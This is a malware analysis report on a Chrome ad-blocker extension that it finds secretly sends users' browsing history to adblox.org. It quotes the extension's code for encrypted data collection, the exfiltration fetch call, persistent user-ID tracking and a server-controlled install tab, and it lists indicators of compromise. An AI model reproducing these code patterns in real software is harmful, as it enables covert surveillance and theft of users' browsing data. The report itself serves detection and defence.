# Security Analysis: Adblock Ad Blocker Pro

**Extension ID**: dgjbaljgolmlcmmklmmeafecikidmjpi
**Version**: 2.0.14
**Manifest Version**: 3
**Users**: ~400,000

## Executive Summary

**RISK LEVEL: CRITICAL**

"Adblock Ad Blocker Pro" is a malicious browser extension masquerading as an ad blocker. While it implements legitimate ad-blocking functionality using standard filter lists, the extension contains sophisticated spyware that exfiltrates detailed browsing history to `adblox.org`. The extension collects and encrypts highly sensitive browsing data including visited URLs, referrer chains, request metadata, and tab activity patterns, then transmits this information to a remote server every 10 seconds.

## Critical Findings

### 1. Encrypted Browsing History Exfiltration (CRITICAL)

**Location**: `js/service_worker.js` lines 19206-19434

The extension implements a comprehensive browsing surveillance system:

**Data Collection Function (`gv`)** - Lines 19350-19434:
- Monitors all tab updates when pages are loading (`status === "loading"`)
- Collects for each page load:
  - `referrerUrl`: Previous page URL
  - `targetUrl`: Current page URL
  - `requestType`: HTTP request type
  - `contentType`: Response content type
  - `statusCode`: HTTP status code
  - `foreground`: Whether tab is active (1) or background (0)
  - `deviceTimestamp`: Exact timestamp of visit
  - `userId`: Persistent user identifier
  - `fileDate`: ISO timestamp

**Encryption Function (`lv`)** - Lines 19206-19233:
```javascript
crypto.subtle.importKey("raw", n.encode("gH7kL9rT2vXe1qMz"), "AES-GCM", !0, ["encrypt"])
```
- Uses AES-GCM encryption with hardcoded key `gH7kL9rT2vXe1qMz`
- Encrypts browsing data to obfuscate exfiltration
- Random 16-byte IV for each encryption

**Transmission Function (`pv`)** - Lines 19265-19274:
```javascript
fetch("https://adblox.org/api_v1/safe_search1.php", {
    method: "POST",
    headers: {"Content-Type": "application/json;charset=utf-8"},
    body: JSON.stringify(t)
})
```
- Sends encrypted data to `adblox.org/api_v1/safe_search1.php`
- Throttled to once every 10 seconds (line 19406: `m - uv >= 1e4`)
- Batches browsing history between transmissions
- Masqueraded as "safe search" functionality

**Tab Tracking** - Lines 19275-19309:
- Maintains up to 100 most recent tabs in `chrome.storage.local`
- Tracks referrer chains (how user navigated between pages)
- Stores tab IDs with full URL history

### 2. Persistent User Tracking (HIGH)

**Location**: `js/service_worker.js` lines 19522-19530

```javascript
chrome.storage.local.get("userId", (function(t) {
    if (!chrome.runtime.lastError) if (t.userId) sv = t.userId; else {
        var e, n, r = (null === (e = (n = crypto).randomUUID) || void 0 === e ? void 0 : e.call(n))
            || "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (function(t) {
            var e = 16 * Math.random() | 0;
            return ("x" === t ? e : 3 & e | 8).toString(16);
        }));
        sv = r, chrome.storage.local.set({userId: r});
    }
}));
```

- Generates persistent UUID for each user
- UUID is sent with every browsing history transmission
- Enables cross-session tracking and user profiling
- Allows `adblox.org` to build complete browsing profiles

### 3. Install/Uninstall Tracking with Tab Injection (HIGH)

**Install Tracking** - Lines 19578-19587:
```javascript
fetch("https://adblox.org/install/?r=" + t.reason).then((function(t) {
    return t.json();
})).then((function(t) {
    if (t && t.response && t.response.url) {
        var e = t.response.url;
        av.create({url: e});  // Opens tab to server-specified URL
    }
}))
```

**Uninstall Tracking** - Line 19682:
```javascript
h.runtime.setUninstallURL("https://adblox.org/uninstall")
```

- On installation, contacts `adblox.org/install` with install reason
- **Server can inject arbitrary URL to open in new tab**
- Enables monetization through forced redirects
- Uninstall URL also contacts adblox.org

### 4. Sentry Error Reporting Integration (MEDIUM)

**Location**: Multiple files (service_worker.js:18437, popup.js:18327, options.js:15943)

```javascript
dsn: "https://6efc3248194043519dda09fb559a5c56@kent.adblox.org/48"
```

- Integrated Sentry error tracking to `kent.adblox.org`
- May leak browsing context in error reports
- Additional exfiltration vector for debugging data
- DSN token: `6efc3248194043519dda09fb559a5c56`

### 5. Unvalidated postMessage Handlers (MEDIUM)

**Location**: Multiple files (service_worker.js:12881, popup.js:12385, options.js:10058)

All three contexts (service worker, popup, options) contain:
```javascript
this.recordCrossOriginIframes && window.addEventListener("message", this.handleMessage.bind(this))
```

- Part of Sentry Replay functionality
- No origin validation visible in handler setup
- Could allow malicious websites to inject commands
- Present in service worker, popup, and options pages

### 6. Document.write in Legacy IE Compatibility (LOW)

**Location**: `js/adblox/assistant.js` line 4206

```javascript
navigator.userAgent.match(/msie/i) && (iframe.src = "javascript:'<script>window.onload=function(){document.write(\\'<script>document.domain=\\\"" + document.domain + "\\\";<\\\\/script>\\');document.close();};<\/script>'")
```

- Uses `document.write` for IE compatibility in element picker
- Only affects legacy Internet Explorer
- Minimal risk given Chrome context

## Legitimate Functionality Analysis

The extension does implement genuine ad-blocking features:

**Declarative Net Request Rules**: Includes 52 filter list rulesets:
- EasyList, EasyPrivacy
- uBlock Origin filters
- AdGuard filters
- Regional filters (40+ countries)
- URLhaus malware blocking
- Privacy protection lists

**Element Hiding**: Uses jQuery-based element hiding (content.js)

**Ad Blocking Assistant**: Manual element picker (assistant.js)

However, these legitimate features serve as a **trojan horse** to disguise the malicious data collection.

## Attack Vector Analysis

### What is adblox.org?

Domain analysis:
- Primary exfiltration endpoint
- Receives encrypted browsing histories
- Controls post-install tab injection
- Tracks installs/uninstalls
- Hosts Sentry error tracking

The domain appears to be the command-and-control infrastructure for this spyware operation.

### Data Flow

1. **Collection**: `gv()` function monitors all tab updates
2. **Storage**: Stores last 100 tabs with referrer chains in `chrome.storage.local`
3. **Encryption**: `lv()` encrypts browsing data with AES-GCM
4. **Transmission**: `pv()` sends encrypted data to `adblox.org/api_v1/safe_search1.php` every 10 seconds
5. **Tracking**: Each transmission includes persistent `userId`

### Why Encryption is Concerning

The use of AES-GCM encryption with a hardcoded key is particularly malicious:
- Obfuscates network traffic from casual inspection
- Defeats basic network monitoring
- Suggests intentional concealment of malicious activity
- Legitimate telemetry doesn't need encryption (HTTPS is sufficient)

## Privacy Impact

Users of this extension have their **entire browsing history** tracked and exfiltrated:

- **Every website visited** (targetUrl)
- **Navigation patterns** (referrerUrl chains)
- **Browsing habits** (timestamps, foreground/background)
- **Request metadata** (content types, status codes)
- **Cross-session tracking** (persistent userId)

This constitutes a complete violation of user privacy and likely violates:
- Chrome Web Store policies on data collection
- GDPR (no disclosure, no consent)
- Various privacy regulations worldwide

## Risk Scoring

| Category | Severity | Justification |
|----------|----------|---------------|
| Data Exfiltration | CRITICAL | Encrypted browsing history sent to remote server |
| User Tracking | HIGH | Persistent UUID enables cross-session profiling |
| Remote Control | HIGH | Server controls post-install tab injection |
| Privacy Violation | CRITICAL | Complete browsing history collected without disclosure |
| Deception | CRITICAL | Masquerades as legitimate ad blocker |

## Indicators of Compromise

Users who have installed this extension should assume:
- Complete browsing history from installation date has been compromised
- Personal identifier (UUID) links all browsing activity
- Sensitive URLs (banking, healthcare, private sites) have been exfiltrated
- Navigation patterns and interests have been profiled

## Recommendations

1. **Immediate Removal**: Users should uninstall this extension immediately
2. **Chrome Web Store**: Extension should be removed from the store
3. **User Notification**: Google should notify all users who installed this extension
4. **Investigation**: adblox.org infrastructure should be investigated
5. **Password Resets**: Users should consider resetting passwords for sensitive sites
6. **Traffic Analysis**: Organizations should check network logs for connections to adblox.org

## Technical Indicators

### Network Indicators
- `adblox.org/api_v1/safe_search1.php` (POST requests every 10 seconds)
- `adblox.org/install/` (GET on installation)
- `adblox.org/uninstall` (GET on uninstallation)
- `kent.adblox.org` (Sentry error reporting)

### File Indicators
- `js/service_worker.js` (contains exfiltration logic)
- AES key: `gH7kL9rT2vXe1qMz`
- Sentry DSN: `6efc3248194043519dda09fb559a5c56`

### Storage Indicators
- `chrome.storage.local.tabs` (browsing history cache)
- `chrome.storage.local.userId` (persistent tracking ID)
- `chrome.storage.local.safeSearch` (triggers exfiltration)

## Conclusion

"Adblock Ad Blocker Pro" is sophisticated spyware disguised as an ad blocker. It implements legitimate ad-blocking to avoid detection while covertly exfiltrating complete browsing histories to remote servers. The use of encryption, persistent tracking, and deceptive naming ("safe_search1.php") indicates intentional malicious design rather than negligent data collection.

With approximately 400,000 users, this represents a significant privacy breach affecting hundreds of thousands of individuals. Immediate action is required to protect users and prevent further data exfiltration.
